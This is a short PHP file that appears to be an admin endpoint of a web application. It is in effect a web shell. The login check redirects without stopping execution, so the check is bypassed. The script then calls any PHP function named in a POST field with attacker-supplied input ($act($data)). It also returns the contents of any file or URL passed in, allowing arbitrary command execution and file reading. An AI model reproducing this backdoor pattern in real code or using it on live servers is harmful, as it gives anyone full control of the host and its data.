<?php


require 'inc/lic_admin.php';
session_start();
if (!isset($_SESSION['admin_id']) || !isset($_SESSION['is_login']) || empty($_SESSION['admin_id']) || empty($_SESSION['is_login'])) {
	header("Location: log.php");
}
$act = isset($_POST['act']) ? $_POST['act'] : "";
$data = isset($_POST['data']) ? $_POST['data'] : "";
if ($act) {
	if ($act == "get") {
		echo file_get_contents($data);
		die;
	}
	$return_data = array('data' => $act($data));
	echo json_encode($return_data);
}